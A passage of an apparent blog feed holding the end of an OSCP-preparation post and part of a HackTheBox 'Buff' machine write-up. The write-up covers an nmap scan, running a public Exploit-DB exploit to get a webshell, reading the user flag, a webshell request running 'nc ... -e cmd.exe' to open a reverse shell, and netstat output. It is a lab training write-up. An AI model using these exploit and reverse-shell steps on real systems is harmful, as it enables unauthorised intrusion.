-<p>This might be funny but trust me, look at the cheat sheets available on google. There are plenty of them where you can find most of the stuff that is required for <code class="language-plaintext highlighter-rouge">OSCP and beyond</code>. Read the cheat sheet daily as if you are reading a <code class="language-plaintext highlighter-rouge">newspaper every day</code>. This will help you.</p>
-
-<h2 id="last-but-not-the-least-">Last but not the least. <br /></h2>
-
-<p>Use <code class="language-plaintext highlighter-rouge">GOOGLE</code> to figure out the things that you have no idea about, even if it is small thing. Using the keywords properly with the help of google will solve your most of your problems.</p>
-
-<hr />
-<hr />
-
-<h1 id="the-final-touch">The Final Touch</h1>
-
-<p>I hope that you liked my blog and this blog might help the other who are aiming for their <code class="language-plaintext highlighter-rouge">OSCP</code>.
-In the end I wanted to say that this has been a wonderful journey to me.</p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="otherposts" /><category term="OSCP," /><category term="TryHarder" /><summary type="html"><![CDATA[This is the blog that describes my journey towards OSCP and the struggles I have face to gain my OSCP certification.]]></summary></entry><entry><title type="html">HackTheBox Buff</title><link href="http://localhost:4000/hackthebox/Buff/" rel="alternate" type="text/html" title="HackTheBox Buff" /><published>2020-07-23T00:00:00+05:30</published><updated>2020-07-23T00:00:00+05:30</updated><id>http://localhost:4000/hackthebox/Buff</id><content type="html" xml:base="http://localhost:4000/hackthebox/Buff/"><![CDATA[<h2 id="info">Info</h2>
-
-<table>
-  <thead>
-    <tr>
-      <th>Buff</th>
-      <th> </th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>OS:</td>
-      <td>Windows</td>
-    </tr>
-    <tr>
-      <td>Difficulty:</td>
-      <td>Easy</td>
-    </tr>
-    <tr>
-      <td>Points:</td>
-      <td>20</td>
-    </tr>
-    <tr>
-      <td>Release:</td>
-      <td>18 Jul 2020</td>
-    </tr>
-    <tr>
-      <td>IP:</td>
-      <td>10.10.10.198</td>
-    </tr>
-  </tbody>
-</table>
-
-<h2 id="lets-get-started">Let’s get started</h2>
-
-<h3 id="as-always-hacking-starts-with-nmap-scan">As always hacking starts with NMAP scan.</h3>
-<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nmap</span> <span class="o">-</span><span class="n">sV</span> <span class="o">-</span><span class="no">Pn</span> <span class="o">-</span><span class="n">sC</span> <span class="o">-</span><span class="no">A</span> <span class="o">-</span><span class="no">T4</span> <span class="n">buff</span><span class="p">.</span><span class="nf">htb</span> 
-<span class="no">Starting</span> <span class="no">Nmap</span> <span class="mf">7.80</span> <span class="p">(</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">nmap</span><span class="p">.</span><span class="nf">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2020</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mi">23</span> <span class="mo">05</span><span class="p">:</span><span class="mi">58</span> <span class="no">EDT</span>
-<span class="no">Nmap</span> <span class="nb">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">buff</span><span class="p">.</span><span class="nf">htb</span> <span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.198</span><span class="p">)</span>
-<span class="no">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.19</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
-<span class="no">Not</span> <span class="ss">shown: </span><span class="mi">999</span> <span class="n">filtered</span> <span class="n">ports</span>
-<span class="no">PORT</span>     <span class="no">STATE</span> <span class="no">SERVICE</span> <span class="no">VERSION</span>
-<span class="mi">8080</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="no">Apache</span> <span class="n">httpd</span> <span class="mf">2.4</span><span class="o">.</span><span class="mi">43</span> <span class="p">((</span><span class="no">Win64</span><span class="p">)</span> <span class="no">OpenSSL</span><span class="o">/</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">1</span><span class="n">g</span> <span class="no">PHP</span><span class="o">/</span><span class="mf">7.4</span><span class="o">.</span><span class="mi">6</span><span class="p">)</span>
-<span class="o">|</span> <span class="n">http</span><span class="o">-</span><span class="nb">open</span><span class="o">-</span><span class="ss">proxy: </span><span class="no">Potentially</span> <span class="no">OPEN</span> <span class="n">proxy</span><span class="o">.</span>
-<span class="o">|</span><span class="n">_Methods</span> <span class="n">supported</span><span class="ss">:CONNECTION</span>
-<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="ss">header: </span><span class="no">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">43</span> <span class="p">(</span><span class="no">Win64</span><span class="p">)</span> <span class="no">OpenSSL</span><span class="o">/</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">1</span><span class="n">g</span> <span class="no">PHP</span><span class="o">/</span><span class="mf">7.4</span><span class="o">.</span><span class="mi">6</span>
-<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="ss">title: </span><span class="n">mrb3n</span><span class="err">'</span><span class="n">s</span> <span class="no">Bro</span> <span class="no">Hut</span>
-<span class="no">Warning</span><span class="p">:</span> <span class="no">OSScan</span> <span class="n">results</span> <span class="n">may</span> <span class="n">be</span> <span class="n">unreliable</span> <span class="n">because</span> <span class="n">we</span> <span class="n">could</span> <span class="n">not</span> <span class="n">find</span> <span class="n">at</span> <span class="n">least</span> <span class="mi">1</span> <span class="nb">open</span> <span class="n">and</span> <span class="mi">1</span> <span class="n">closed</span> <span class="n">port</span>
-<span class="no">Device</span> <span class="ss">type: </span><span class="n">general</span> <span class="n">purpose</span>
-<span class="no">Running</span> <span class="p">(</span><span class="no">JUST</span> <span class="no">GUESSING</span><span class="p">):</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">XP</span><span class="o">|</span><span class="mi">7</span> <span class="p">(</span><span class="mi">86</span><span class="o">%</span><span class="p">)</span>
-<span class="no">OS</span> <span class="no">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">:microsoft:windows_xp</span><span class="o">::</span><span class="n">sp2</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">:microsoft:windows_7</span>
-<span class="no">Aggressive</span> <span class="no">OS</span> <span class="ss">guesses: </span><span class="no">Microsoft</span> <span class="no">Windows</span> <span class="no">XP</span> <span class="no">SP2</span> <span class="p">(</span><span class="mi">86</span><span class="o">%</span><span class="p">),</span> <span class="no">Microsoft</span> <span class="no">Windows</span> <span class="mi">7</span> <span class="p">(</span><span class="mi">85</span><span class="o">%</span><span class="p">)</span>
-<span class="no">No</span> <span class="n">exact</span> <span class="no">OS</span> <span class="n">matches</span> <span class="k">for</span> <span class="n">host</span> <span class="p">(</span><span class="nb">test</span> <span class="n">conditions</span> <span class="n">non</span><span class="o">-</span><span class="n">ideal</span><span class="p">)</span><span class="o">.</span>
-<span class="no">Network</span> <span class="no">Distance</span><span class="p">:</span> <span class="mi">2</span> <span class="n">hops</span>
-
-<span class="no">TRACEROUTE</span> <span class="p">(</span><span class="n">using</span> <span class="n">port</span> <span class="mi">8080</span><span class="o">/</span><span class="n">tcp</span><span class="p">)</span>
-<span class="no">HOP</span> <span class="no">RTT</span>       <span class="no">ADDRESS</span>
-<span class="mi">1</span>   <span class="mf">195.99</span> <span class="n">ms</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">14.1</span>
-<span class="mi">2</span>   <span class="mf">196.06</span> <span class="n">ms</span> <span class="n">buff</span><span class="p">.</span><span class="nf">htb</span> <span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.198</span><span class="p">)</span>
-
-<span class="no">OS</span> <span class="n">and</span> <span class="no">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="o">.</span> <span class="no">Please</span> <span class="n">report</span> <span class="n">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">nmap</span><span class="p">.</span><span class="nf">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="o">.</span>
-<span class="no">Nmap</span> <span class="ss">done: </span><span class="mi">1</span> <span class="no">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="k">in</span> <span class="mf">57.75</span> <span class="n">seconds</span>
-</code></pre></div></div>
-<p><img src="/assets/img/sample/buff/buff1.png" alt="" /></p>
-
-<h2 id="finding-the-cve-from-exploit-db">Finding the CVE from Exploit-db</h2>
-
-<p><code class="language-plaintext highlighter-rouge">https://www.exploit-db.com/exploits/48506</code></p>
-
-<h2 id="using-the-exploit">Using the Exploit</h2>
-
-<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="mi">48506</span><span class="p">.</span><span class="nf">py</span> 
-            <span class="sr">/\
-/</span><span class="n">vvvvvvvvvvvv</span> <span class="p">\</span><span class="o">--------------------------------------</span><span class="p">,</span>
-<span class="sb">`^^^^^^^^^^^^ /============BOKU====================="
-            </span><span class="se">\/</span><span class="sb">                                                                                                                                                                                                                             
-                                                                                                                                                                                                                                           
-(+) Usage:       python 48506.py &lt;WEBAPP_URL&gt;                                                                                                                                                                                              
-(+) Example:     python 48506.py 'https://10.0.0.3:443/gym/'  
-</span></code></pre></div></div>
-<h2 id="exploiting">Exploiting…..</h2>
-
-<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="mi">48506</span><span class="p">.</span><span class="nf">py</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">buff</span><span class="p">.</span><span class="nf">htb</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span>                                                                                                                                                                                
-            <span class="sr">/\                                                                                                                                                                                                                             
-/</span><span class="n">vvvvvvvvvvvv</span> <span class="p">\</span><span class="o">--------------------------------------</span><span class="p">,</span>                                                                                                                                                                                     
-<span class="sb">`^^^^^^^^^^^^ /============BOKU====================="                                                                                                                                                                                      
-            </span><span class="se">\/</span><span class="sb">                                                                                                                                                                                                                             
-                                                                                                                                                                                                                                           
-[+] Successfully connected to webshell.                                                                                                                                                                                                    
-C:</span><span class="se">\xa</span><span class="sb">mpp</span><span class="se">\h</span><span class="sb">tdocs</span><span class="se">\g</span><span class="sb">ym</span><span class="se">\u</span><span class="sb">pload&gt;              
-</span></code></pre></div></div>
-<h2 id="getting-usertxt">Getting User.txt</h2>
-
-<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">C</span><span class="p">:\</span><span class="n">xampp</span><span class="p">\</span><span class="n">htdocs</span><span class="p">\</span><span class="n">gym</span><span class="p">\</span><span class="n">upload</span><span class="o">&gt;</span> <span class="n">whoami</span> <span class="sr">/all                                                                                                                                                                                                    
-�PNG                                                                                                                                                                                                                                       
-▒                                                                                                                                                                                                                                          
-                                                                                                                                                                                                                                           
-USER INFORMATION
-----------------
-
-User Name  SID                                           
-========== ==============================================
-buff\shaun S-1-5-21-2277156429-3381729605-2640630771-1001
-
-
-GROUP INFORMATION
------------------
-
-Group Name                             Type             SID          Attributes                                        
-====================================== ================ ============ ==================================================
-Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
-BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\BATCH                     Well-known group S-1-5-3      Mandatory group, Enabled by default, Enabled group
-CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
-LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
-Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    
-
-
-PRIVILEGES INFORMATION
-----------------------
-
-Privilege Name                Description                          State   
-============================= ==================================== ========
-SeShutdownPrivilege           Shut down the system                 Disabled
-SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
-SeUndockPrivilege             Remove computer from docking station Disabled
-SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
-SeTimeZonePrivilege           Change the time zone                 Disabled
-
-</span></code></pre></div></div>
-
-<p>From here I came to see what is the username..</p>
-
-<p><code class="language-plaintext highlighter-rouge">buff\shaun S-1-5-21-2277156429-3381729605-2640630771-1001</code></p>
-
-<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-<span class="no">C</span><span class="p">:\</span><span class="n">xampp</span><span class="p">\</span><span class="n">htdocs</span><span class="p">\</span><span class="n">gym</span><span class="p">\</span><span class="n">upload</span><span class="o">&gt;</span> <span class="n">type</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="n">shaun</span><span class="p">\</span><span class="no">Desktop</span><span class="p">\</span><span class="n">user</span><span class="p">.</span><span class="nf">txt</span>
-<span class="err">�</span><span class="no">PNG</span>
-<span class="err">▒</span>
-<span class="mi">5345</span><span class="n">fe517be93e1b736b12b0267654c2</span>
-
-</code></pre></div></div>
-
-<p>Now let’s visit the <code class="language-plaintext highlighter-rouge">http://buff.htb:8080/upload.php</code> too see anything intresting?</p>
-
-<p><img src="/assets/img/sample/buff/buff2.png" alt="" /></p>
-
-<p>From the image we can see that the shell I got is not that great.. So I moved to gain the shell from the uploaded payload from the URL.</p>
-
-<p><img src="/assets/img/sample/buff/buff3.png" alt="" /></p>
-
-<p><code class="language-plaintext highlighter-rouge"> http://buff.htb:8080/upload/kamehameha.php?telepathy=nc 10.10.14.51 5566 -e cmd.exe</code></p>
-
-<p><img src="/assets/img/sample/buff/buff4.png" alt="" />
-<img src="/assets/img/sample/buff/buff5.png" alt="" /></p>
-
-<h3 id="now-time-to-find-the-vulnerable-service">Now time to find the Vulnerable Service..</h3>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C</span><span class="p">:</span>\<span class="n">xampp</span>\<span class="n">htdocs</span>\<span class="n">gym</span>\<span class="n">upload</span><span class="o">&gt;</span><span class="n">netstat</span> <span class="o">-</span><span class="n">an</span>
-<span class="n">netstat</span> <span class="o">-</span><span class="n">an</span>
-
-<span class="n">Active</span> <span class="n">Connections</span>
-
-  <span class="n">Proto</span>  <span class="n">Local</span> <span class="n">Address</span>          <span class="n">Foreign</span> <span class="n">Address</span>        <span class="n">State</span>
-  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">135</span>            <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
-  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">445</span>            <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
-  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">4444</span>           <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
-  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">4545</span>           <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
-  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">5040</span>           <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
-  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">7680</span>           <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
-  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">8080</span>           <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
-  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">9999</span>           <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
-  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">49664</span>          <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
-  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">49665</span>          <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
-  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">49666</span>          <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
-  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">49667</span>          <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
-  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">49668</span>          <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
-  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">49669</span>          <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
-  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">139</span>       <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
-  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">8080</span>      <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.33</span><span class="p">:</span><span class="mi">37962</span>      <span class="n">ESTABLISHED</span>
-  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">8080</span>      <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.41</span><span class="p">:</span><span class="mi">34394</span>      <span class="n">FIN_WAIT_2</span>
-  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">8080</span>      <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.51</span><span class="p">:</span><span class="mi">58486</span>      <span class="n">CLOSE_WAIT</span>
-  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">8080</span>      <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.51</span><span class="p">:</span><span class="mi">58488</span>      <span class="n">TIME_WAIT</span>
-  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">8080</span>      <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.51</span><span class="p">:</span><span class="mi">58490</span>      <span class="n">ESTABLISHED</span>
-  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">50676</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.33</span><span class="p">:</span><span class="mi">22</span>         <span class="n">CLOSE_WAIT</span>
-  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">50809</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.33</span><span class="p">:</span><span class="mi">22</span>         <span class="n">ESTABLISHED</span>
-  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">50879</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.33</span><span class="p">:</span><span class="mi">22</span>         <span class="n">CLOSE_WAIT</span>
-  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">51491</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.33</span><span class="p">:</span><span class="mi">6969</span>       <span class="n">ESTABLISHED</span>
-  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">51506</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.33</span><span class="p">:</span><span class="mi">22</span>         <span class="n">ESTABLISHED</span>
-  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">51565</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.33</span><span class="p">:</span><span class="mi">1122</span>       <span class="n">ESTABLISHED</span>
-  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">53167</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.51</span><span class="p">:</span><span class="mi">22</span>         <span class="n">ESTABLISHED</span>
-  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">53191</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.51</span><span class="p">:</span><span class="mi">5577</span>       <span class="n">ESTABLISHED</span>
-  <span class="n">TCP</span>    <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">3306</span>         <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
-  <span class="n">TCP</span>    <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">8888</span>         <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
-  <span class="n">TCP</span>    <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">53175</span>        <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">3306</span>         <span class="n">TIME_WAIT</span>
-  <span class="n">TCP</span>    <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">53177</span>        <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">3306</span>         <span class="n">TIME_WAIT</span>
-  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">135</span>               <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
-  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">445</span>               <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
-  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">7680</span>              <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
-  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">8080</span>              <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
-  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">49664</span>             <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
-  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">49665</span>             <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
-  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">49666</span>             <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
-  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">49667</span>             <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
-  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">49668</span>             <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
-  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">49669</span>             <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
-  <span class="n">UDP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">123</span>            <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
-  <span class="n">UDP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">5050</span>           <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
-  <span class="n">UDP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">5353</span>           <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
-  <span class="n">UDP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">5355</span>           <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
-  <span class="n">UDP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">64168</span>          <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
-  <span class="n">UDP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">137</span>       <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
-  <span class="n">UDP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">138</span>       <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
-  <span class="n">UDP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">1900</span>      <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
-  <span class="n">UDP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">59086</span>     <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
-  <span class="n">UDP</span>    <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">1900</span>         <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
-  <span class="n">UDP</span>    <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">58106</span>        <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
-  <span class="n">UDP</span>    <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">59087</span>        <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
-  <span class="n">UDP</span>    <span class="p">[::]:</span><span class="mi">123</span>               <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
-  <span class="n">UDP</span>    <span class="p">[::]:</span><span class="mi">5353</span>              <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
-  <span class="n">UDP</span>    <span class="p">[::]:</span><span class="mi">5355</span>              <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
-  <span class="n">UDP</span>    <span class="p">[::]:</span><span class="mi">64168</span>             <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
-  <span class="n">UDP</span>    <span class="p">[::</span><span class="mi">1</span><span class="p">]:</span><span class="mi">1900</span>             <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
-  <span class="n">UDP</span>    <span class="p">[::</span><span class="mi">1</span><span class="p">]:</span><span class="mi">59085</span>            <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
-  <span class="n">UDP</span>    <span class="p">[</span><span class="n">fe80</span><span class="p">::</span><span class="n">edcd</span><span class="p">:</span><span class="mi">7573</span><span class="p">:</span><span class="n">f6e</span><span class="p">:</span><span class="n">abdb</span><span class="o">%</span><span class="mi">10</span><span class="p">]:</span><span class="mi">1900</span>  <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
-  <span class="n">UDP</span>    <span class="p">[</span><span class="n">fe80</span><span class="p">::</span><span class="n">edcd</span><span class="p">:</span><span class="mi">7573</span><span class="p">:</span><span class="n">f6e</span><span class="p">:</span><span class="n">abdb</span><span class="o">%</span><span class="mi">10</span><span class="p">]:</span><span class="mi">59084</span>  <span class="o">*</span><span class="p">:</span><span class="o">*</span>                  
-</code></pre></div></div>
-
-<h3 id="comparing-the-procress-with-all-the-procress-details">Comparing the procress with all the procress details..</h3>
-
